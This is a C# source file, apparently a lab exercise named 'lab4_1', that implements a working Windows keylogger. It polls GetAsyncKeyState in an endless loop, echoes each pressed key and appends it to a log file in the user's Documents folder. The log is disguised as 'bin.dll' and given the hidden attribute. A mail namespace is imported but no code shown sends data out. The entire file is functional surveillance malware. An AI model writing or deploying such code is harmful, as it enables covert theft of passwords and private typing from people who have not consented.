using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Net;
using System.Net.Mail;

namespace lab4_1
{
    class Program
    {

        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);


        static void Main(string[] args)
        {
            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            string path = (filepath + @"\bin.dll");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path)) { }
            }
            File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);


            while (true)
            {
                Thread.Sleep(5);

                for (int i = 0; i < 2000; i++)
                {
                    int keyState = GetAsyncKeyState(i);

                    if (keyState == 32769)
                    {
                        Console.Write((char)i);

                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char)i);
                        }
                    }
                }
            }

        }
    }


}